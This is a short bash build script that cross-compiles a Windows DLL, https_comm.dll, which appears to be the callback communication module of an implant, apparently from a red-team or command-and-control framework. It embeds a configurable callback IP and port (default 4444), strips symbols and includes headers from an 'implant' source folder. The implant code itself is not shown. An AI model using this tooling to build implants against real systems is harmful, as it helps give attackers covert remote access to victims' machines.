#!/usr/bin/env bash
# Build https_comm.dll (Windows x86_64 DLL, no external runtime dependencies).
# Requires mingw-w64: apt install gcc-mingw-w64-x86-64
# Usage: ./build.sh [CB_IP] [CB_PORT]
CB_IP="${1:-127.0.0.1}"
CB_PORT="${2:-4444}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
IMPLANT_INC="$SCRIPT_DIR/../../../src/implant"

x86_64-w64-mingw32-gcc -shared -fPIC -O2 -s \
  "$SCRIPT_DIR/https_comm.c" \
  -I "$IMPLANT_INC" \
  -DCB_IP="\"$CB_IP\"" -DCB_PORT="$CB_PORT" \
  -lwinhttp -lws2_32 -ladvapi32 \
  -o "$SCRIPT_DIR/https_comm.dll" \
  && echo "[+] Built: $SCRIPT_DIR/https_comm.dll"
